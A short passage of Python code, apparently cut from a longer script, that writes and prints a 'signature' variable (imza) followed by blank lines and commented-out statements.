            	yaz(imza+'\n'+'\n')
            	print('u' +imza)
            	#print("********")
	##except:pass
	   

	

	

	

	
	
